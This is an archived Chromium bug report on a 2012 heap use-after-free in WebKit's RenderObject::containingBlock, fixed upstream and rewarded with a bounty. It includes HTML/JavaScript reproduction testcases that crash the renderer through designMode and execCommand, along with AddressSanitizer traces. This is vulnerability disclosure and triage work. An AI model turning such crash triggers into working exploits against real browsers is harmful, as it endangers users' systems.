# Heap-use-after-free in WebCore::RenderObject::containingBlock

| Field | Value |
|-------|-------|
| **Issue ID** | [40055066](https://issues.chromium.org/issues/40055066) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2012-03-15 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::RenderObject::containingBlock

**VERSION**  

Chrome Version:  

Chromium 19.0.1070.0 (Developer Build 126778)  

OS Linux  

WebKit 536.3 (@110733)

Operating System: 64bit ubuntu

**REPRODUCTION CASE**

<html>
<head>
<style>
#el0 { position: relative; }
#el2 { outline-style: dashed; }
</style>
<script>
onload = function() {
el0=document.createElement('span')
el0.setAttribute('id','el0')
document.body.appendChild(el0)
el1=document.createElement('div')
el0.appendChild(el1)
el1.appendChild(document.createElement('input'))
el0.appendChild(document.createTextNode('A'))
el2=document.createElement('q')
el2.setAttribute('id','el2')
document.body.appendChild(el2)
el2.appendChild(document.createElement('div'))
el2.appendChild(document.createElement('input'))
document.designMode='on'
document.execCommand('selectall')
document.execCommand('FormatBlock', false, '<'+'pre>')
document.execCommand('Undo')
setTimeout(function() {
document.execCommand('removeformat')
}, 0)
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==24770== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffc85c4598 at pc 0x55555ac752fb bp 0x7fffffff2370 sp 0x7fffffff2368  

READ of size 8 at 0x7fffc85c4598 thread T0  

#0 0x55555ac752fb in WebCore::RenderObject::containingBlock() const ???:0  

#1 0x55555aa5d025 in WebCore::RenderBlock::paintContinuationOutlines(WebCore::PaintInfo&, WebCore::IntPoint const&) ???:0

0x7fffc85c4598 is located 24 bytes inside of 104-byte region [0x7fffc85c4580,0x7fffc85c45e8)  

freed by thread T0 here:  

#0 0x55555dd238e2 in free ??:0  

#1 0x5555592f6117 in WebCore::Node::detach() ???:0  

#2 0x5555592b902d in WebCore::Element::detach() ???:0

## Attachments

- [24104.txt](attachments/24104.txt) (text/x-c; charset=us-ascii, 10.8 KB)
- [24104.html](attachments/24104.html) (text/html; charset=us-ascii, 1009 B)

## Timeline

### in...@chromium.org (2012-03-15)

even though crashing differently, free stack is exactly same editing stack as http://code.google.com/p/chromium/issues/detail?id=117698

### [Deleted User] (2012-03-15)

Looks like a stale continuation is in the list iterated over in RenderBlock::paintContinuationOutlines().

Filed upstream as https://bugs.webkit.org/show_bug.cgi?id=81276

### in...@chromium.org (2012-03-17)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=27228682

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f5e2cb7c398
Crash State:
  - crash stack -
  WebCore::RenderObject::containingBlock
  WebCore::RenderBlock::paintContinuationOutlines
  - free stack -
  WebCore::Node::detach
  WebCore::Element::detach
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=122724:122726

Minimized Testcase (0.95 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94riDqsoPQ0m_U5Bd1jpxJy0VEiqaoIs1Hcghfu8W8J6uXoa7Ae0a8V86J2nF8_7ZtzSKCKZxqaGORbTCDOD5eSyZ_LO_7p9Mxp8u-MLr6E_cbF8cuehi4RmAWRjilS11p0oMjNPmsbtRtAHab0My_3YFSeEw
<style>
      #el0 { position: relative; }
      #el2 { outline-style: dashed;</style>
    <script>
      onload = function() {
        el0=document.createElement('span')
        el0.setAttribute('id','el0')
        document.body.appendChild(el0)
        el1=document.createElement('div')
        el0.appendChild(el1)
        el1.appendChild(document.createElement('input'))
        el0.appendChild(document.createTextNode('A'))
        el2=document.createElement('q')
        el2.setAttribute('id','el2')
        document.body.appendChild(el2)
        el2.appendChild(document.createElement('div'))
        el2.appendChild(document.createElement('input'))
        document.designMode='on'
        document.execCommand('selectall')
        document.execCommand('FormatBlock', false, '<'+'pre>')
        document.execCommand('Undo')
        setTimeout(function() {
        document.execCommand('removeformat')
        location.reload()
        }, 0)
      }
    </script>

### in...@chromium.org (2012-03-17)

[Empty comment from Monorail migration]

### la...@chromium.org (2012-03-19)

If it's P1 and due in a week (M19), let's get owners for these ASAP.

### ka...@google.com (2012-03-19)

any update on this upstream? says i can't see the bug.

### in...@chromium.org (2012-03-19)

regressed in https://trac.webkit.org/changeset/108185/

### [Deleted User] (2012-03-19)

I looked at this and doubt that I have the webkitfoo to fix it. I think Robert (who regressed it) is looking.

### in...@chromium.org (2012-03-20)

Robert has discussed a one-word patch with Hyatt. So, we should see this closing soon.

### in...@chromium.org (2012-03-20)

http://trac.webkit.org/changeset/111439

### sc...@gmail.com (2012-05-04)

Regression catch! Woohoo
$1000

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/118490?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055066)*
